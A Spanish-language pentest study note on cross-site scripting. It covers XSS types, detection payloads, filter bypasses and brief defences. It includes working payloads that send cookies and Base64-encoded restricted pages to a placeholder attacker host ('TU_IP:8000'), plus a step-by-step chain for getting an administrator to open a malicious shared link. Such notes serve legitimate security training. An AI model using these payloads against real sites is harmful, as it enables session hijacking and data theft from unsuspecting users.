# XSS — Cross-Site Scripting

> XSS es una de las vulnerabilidades web más comunes y peligrosas. Permite inyectar JavaScript que se ejecuta en el navegador de otros usuarios.

---

## 1. Tipos de XSS

| Tipo | Descripción | Persistencia |
|------|-------------|-------------|
| **Reflected XSS** | El payload viaja en la URL/parámetro y se refleja en la respuesta sin sanitizar | No persistente |
| **Stored XSS** | El payload se almacena en base de datos y se muestra a todos los usuarios que visitan la página | Persistente |
| **DOM-based XSS** | La vulnerabilidad está en el código JavaScript del lado del cliente, no en el servidor | Depende del caso |

---

## 2. Payloads de detección

```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### Payloads de exfiltración de cookies

```html
<script>
fetch('http://TU_IP:8000/steal?c='+document.cookie)
</script>

<script>
new Image().src='http://TU_IP:8000/steal?c='+document.cookie
</script>

<img src=x onerror="fetch('http://TU_IP:8000/steal?c='+document.cookie)">
```

---

## 3. El valor real del XSS: el delivery

No está en el `alert()`, sino en el mecanismo de **delivery**: cómo se consigue que otro usuario (idealmente un administrador) lo ejecute.

### Cadena completa de explotación

1. Un **Markdown Viewer** permite subir contenido con `<script>`
2. La aplicación ofrece un botón "Share" que genera un enlace compartible
3. Ese enlace es el **vector de entrega** → se envía al admin
4. El admin abre el enlace → el script se ejecuta en su navegador
5. Se roba la sesión del admin → acceso a rutas restringidas

---

## 4. Confirmar interacción del administrador

Levantar un servidor HTTP local y comprobar si llega una petición:

```bash
python3 -m http.server 8000
# Enviar por el formulario de contacto: http://TU_IP:8000/track
# Si aparece un GET en el log del servidor, el admin ha abierto el enlace
```

---

## 5. Exfiltración de datos

Una vez confirmada la interacción, forzar al navegador de la víctima a hacer `fetch()` hacia una ruta restringida y exfiltrar el contenido codificado en Base64:

```html
<script>
fetch('/message.php')
  .then(r => r.text())
  .then(t => fetch('http://TU_IP:8000/exfil?data=' + btoa(t)));
</script>
```

> **Base64 no es cifrado:** es solo un envoltorio para transportar contenido sin romper el formato de la petición.

---

## 6. XSS en diferentes contextos

### XSS en atributos HTML

```html
" onfocus="alert(1)" autofocus="
" onmouseover="alert(1)"
'><script>alert(1)</script>
```

### XSS en JavaScript

```
';alert(1);//
"-alert(1)-"
</script><script>alert(1)</script>
```

### XSS en CSS (limitado)

```css
<style>
body { background: url("javascript:alert(1)") }
</style>
```

---

## 7. Bypass de filtros

| Filtro | Bypass |
|--------|--------|
| `<script>` bloqueado | `<img src=x onerror=alert(1)>` |
| `alert` bloqueado | `prompt(1)`, `confirm(1)`, `window.onerror=alert;throw 1` |
| `onerror` bloqueado | `<svg onload=alert(1)>` |
| Comillas bloqueadas | Usar entidades HTML: `&#39;`, `&#34;` |
| Mayúsculas bloqueadas | `<ScRiPt>`, `<IMG SRC=x OnErRoR=alert(1)>` |
| Espacios bloqueados | Tab `\t`, newline `\n`, `%0a`, `%0d` |

---

## 8. XSS en APIs

Las APIs REST también pueden ser vulnerables a XSS si devuelven contenido HTML sin sanitizar:

```json
GET /api/users/1
{
  "name": "<script>alert(1)</script>",
  "bio": "Usuario normal"
}
```

Si el frontend renderiza `name` o `bio` sin escaping, el XSS se ejecuta.

---

## 9. Defensa contra XSS

| Medida | Descripción |
|--------|-------------|
| **Output encoding** | Convertir caracteres especiales en entidades HTML antes de renderizar |
| **Content Security Policy (CSP)** | Restringir scripts inline y dominios permitidos |
| **HttpOnly cookies** | Impedir que JavaScript acceda a las cookies de sesión |
| **Input validation** | Validar entrada en servidor con esquemas/tipos estrictos |
| **DOMPurify** | Librería para sanitizar HTML en el cliente |

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Vulnerabilidades Web — OWASP Top 10 y Burp Suite]] — XSS dentro del OWASP Top 10
- [[Burp Suite - Framework de Auditoría]] — Herramienta para interceptar y probar XSS
- [[Enumeración Web]] — Fuzzing de parámetros que pueden ser XSS
- [[OWASP API Security Top 10]] — XSS en APIs

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/FFUF|FFUF]]

### 🎯 Vulnerabilidades Relacionadas

- [[SSRF — Server-Side Request Forgery]] — Exfiltración similar
- [[SQL Injection]] — Inyección en servidor vs en cliente

> #burpsuite #pentest #xss #web
